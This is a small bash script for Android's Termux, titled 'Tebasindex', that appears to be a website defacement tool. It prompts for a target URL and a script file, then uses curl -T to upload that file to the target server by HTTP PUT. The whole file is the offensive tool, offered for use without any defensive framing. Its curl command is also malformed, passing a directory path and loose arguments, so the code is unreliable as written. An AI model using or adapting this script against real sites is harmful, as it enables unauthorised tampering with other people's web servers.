#!/data/data/com.termux/files/usr/bin/bash
# Tebasindex
# Coded by Senja
# Github: https://github.com/stepbystep/Tebasindex
checkroot(){
if [[ "$(id -u)" -ne 0 ]]; then
    printf "\e[0m[\e[1;91m!\e[0m] \e[1;77mPlease, run this program as root!\n\n\e[0m"
    exit 1
fi
}
clearscreen() {
    clear
    reset
    sleep 1
}
dependencies(){
    command -v bash > /dev/null 2>&1 || { echo >&2 "I require bash but it's not installed. Install it. Aborting."; exit 1; }
    command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Install it. Aborting."; exit 1; }
    command -v openssl > /dev/null 2>&1 || { echo >&2 "I require openssl but it's not installed. Install it. Aborting."; exit 1; }
    if [ $(ls /dev/urandom >/dev/null; echo $?) == "1" ]; then
        echo "/dev/urandom not found!"
    exit 1
fi
}
banner(){
printf "\n\e[0;33m
▄▄▄▄▄▄▄▄ .▄▄▄▄·  ▄▄▄· .▄▄ ·  ▄▄▄▄▄ ▐ ▄ ·▄▄▄▄  ▄▄▄ .▐▄• ▄
•██  ▀▄.▀·▐█ ▀█▪▐█ ▀█ ▐█ ▀.  •██  •█▌▐███▪ ██ ▀▄.▀· █▌█▌▪
 ▐█.▪▐▀▀▪▄▐█▀▀█▄▄█▀▀█ ▄▀▀▀█▄  ▐█.▪▐█▐▐▌▐█· ▐█▌▐▀▀▪▄ ·██·
 ▐█▌·▐█▄▄▌██▄▪▐█▐█ ▪▐▌▐█▄▪▐█  ▐█▌·██▐█▌██. ██ ▐█▄▄▌▪▐█·█▌
 ▀▀▀  ▀▀▀ ·▀▀▀▀  ▀  ▀  ▀▀▀▀   ▀▀▀ ▀▀ █▪▀▀▀▀▀•  ▀▀▀ •▀▀ ▀▀
\n"
}
template(){
    printf "\e[0;45;77;1m[         Tebas Indexs v1.0, Coded by @stepbystep        ]\e[0m\n"
    sleep 1
    printf "\n"
}
ready(){
    read -p $'\e[0m[\e[1;95m?\e[0m\e[0m] \e[1;77mWeb Target: \e[0m' link
    read -p $'\e[0m[\e[1;92m+\e[0m\e[0m] \e[1;77mInput Script: \e[0m' script
    sleep 1.5
    printf "\n\e[0m[\e[1;91m!\e[0m] \e[1;77mChecking ...\n"
    echo
    sleep 3
    curl -T /storage/emulated/0/ $script $link
    printf "\n\e[0m[\e[1;96m#\e[0m] \e[1;77mPlease see the link. \n\e[0m"
    echo
    exit 1
    echo
}
    #checkroot
    #dependencies
        clearscreen
        banner
        template
        ready
